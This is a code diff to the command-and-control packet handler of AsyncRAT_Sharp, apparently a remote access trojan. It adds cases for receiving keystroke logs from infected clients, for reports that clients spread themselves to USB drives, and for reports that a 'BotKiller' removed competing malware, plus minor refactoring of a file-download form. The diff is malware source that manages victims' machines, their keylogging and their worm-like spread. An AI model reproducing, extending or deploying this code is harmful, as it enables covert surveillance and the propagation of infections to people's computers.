@@ -42,14 +42,37 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                 Client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                                 Program.form1.listView1.Items.Insert(0, Client.LV);
                                 lock (Settings.Online)
+                                {
                                     Settings.Online.Add(Client);
+                                }
                             }));
+                            HandleLogs.Addmsg($"Client {Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);
                         }
                         break;
 
                     case "Ping":
                         {
                             Debug.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
+                        }
+                        break;
+
+                    case "Logs":
+                        {
+                            HandleLogs.Addmsg(unpack_msgpack.ForcePathObject("Message").AsString, Color.Black);
+                        }
+                        break;
+
+
+                    case "BotKiller":
+                        {
+                            HandleLogs.Addmsg($"Client {Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} malwares and killed them successfully", Color.Orange);
+                        }
+                        break;
+
+
+                    case "usbSpread":
+                        {
+                            HandleLogs.Addmsg($"Client {Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
                         }
                         break;
 
@@ -160,7 +183,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                                 {
                                                     SD.C = Client;
                                                     SD.labelfile.Text = Path.GetFileName(file);
-                                                    SD.Size = Convert.ToInt64(size);
+                                                    SD.dSize = Convert.ToInt64(size);
                                                     SD.timer1.Start();
                                                 }
                                             }));
@@ -191,6 +214,28 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             break;
                         }
 
+                    case "keyLogger":
+                        {
+                            if (Program.form1.InvokeRequired)
+                            {
+                                Program.form1.BeginInvoke((MethodInvoker)(() =>
+                                {
+                                    Keylogger KL = (Keylogger)Application.OpenForms["keyLogger:" + Client.ID];
+                                    if (KL != null)
+                                    {
+                                        KL.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Log").GetAsString());
+                                    }
+                                    else
+                                    {
+                                        MsgPack msgpack = new MsgPack();
+                                        msgpack.ForcePathObject("Packet").AsString = "keyLogger";
+                                        msgpack.ForcePathObject("Log").AsString = "false";
+                                        Client.BeginSend(msgpack.Encode2Bytes());
+                                    }
+                                }));
+                            }
+                            break;
+                        }
 
                     case "fileManager":
                         {
@@ -290,6 +335,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                         }
                 }
             }
+
             catch (Exception ex)
             {
                 Debug.WriteLine(ex.Message);
